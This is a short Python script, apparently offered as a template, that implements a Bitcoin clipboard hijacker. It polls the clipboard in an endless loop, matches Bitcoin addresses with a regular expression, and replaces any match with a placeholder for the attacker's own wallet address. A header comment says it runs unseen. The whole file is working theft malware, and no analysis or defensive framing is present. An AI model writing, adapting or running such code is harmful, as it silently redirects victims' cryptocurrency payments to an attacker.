#
# Supprocess, cannot be seen
#
import re
import pyperclip

regex = r"\b((bc|tb)(0([ac-hj-np-z02-9]{39}|[ac-hj-np-z02-9]{59})|1[ac-hj-np-z02-9]{8,87})|([13]|[mn2])[a-km-zA-HJ-NP-Z1-9]{25,39})\b"

def btc_clipper(data):
     if re.match(r"\b((bc|tb)(0([ac-hj-np-z02-9]{39}|[ac-hj-np-z02-9]{59})|1[ac-hj-np-z02-9]{8,87})|([13]|[mn2])[a-km-zA-HJ-NP-Z1-9]{25,39})\b", data):
        pyperclip.copy("YOUR BITCOIN WALLET ADDRESS")

while True:
    data = pyperclip.paste()
    if data != "None":
        btc_clipper(data)